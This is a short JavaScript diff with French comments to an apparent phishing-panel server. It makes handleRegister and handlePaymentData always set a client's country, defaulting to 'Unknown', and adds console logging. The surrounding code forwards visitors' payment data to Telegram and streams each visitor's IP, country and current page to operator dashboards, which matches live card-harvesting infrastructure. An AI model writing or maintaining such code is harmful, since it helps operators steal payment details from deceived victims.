@@ -773,9 +773,9 @@ async function handleRegister(clientId, data) {
     }
     
     // Mettre à jour le pays dans les données du client pour les prochaines utilisations
-    if (country && country !== 'Unknown') {
-      client.country = country;
-    }
+    // IMPORTANT: Toujours mettre à jour le pays, même s'il est "Unknown", pour éviter les valeurs null/undefined
+    client.country = country || 'Unknown';
+    console.log(`[handleRegister] ✅ Country updated in client data: ${client.country}`);
     
     await telegram.notifyAuthorizedVisitor({
       ip: client.ip,
@@ -792,12 +792,15 @@ async function handleRegister(clientId, data) {
   // Notifier les dashboards
   const notificationType = client.role === 'client' ? 'client_registered' : 'dashboard_connected';
   console.log(`[handleRegister] 📢 Broadcasting ${notificationType} to ${dashboards.size} dashboard(s)`);
+  // S'assurer que le pays est bien défini avant l'envoi
+  const countryToSend = client.country || 'Unknown';
+  console.log(`[handleRegister] 📢 Sending country: ${countryToSend}`);
   broadcastToDashboards({
     type: notificationType,
     client: {
       id: clientId,
       ip: client.ip,
-      country: client.country,
+      country: countryToSend,
       current_page: client.current_page,
       connectedAt: client.connectedAt,
     },
@@ -965,12 +968,15 @@ async function handlePaymentData(clientId, data) {
   console.log(`[handlePaymentData] ✅ Telegram notification result:`, telegramResult);
 
   // Notifier les dashboards avec toutes les données
+  // S'assurer que le pays est bien défini
+  const countryToSend = client.country || country || 'Unknown';
+  console.log(`[handlePaymentData] 📢 Broadcasting client_updated, country: ${countryToSend}`);
   broadcastToDashboards({
     type: 'client_updated',
     client: {
       id: clientId,
       ip: client.ip,
-      country: client.country,
+      country: countryToSend,
       current_page: client.current_page,
       connectedAt: client.connectedAt,
       last_seen: client.last_seen,
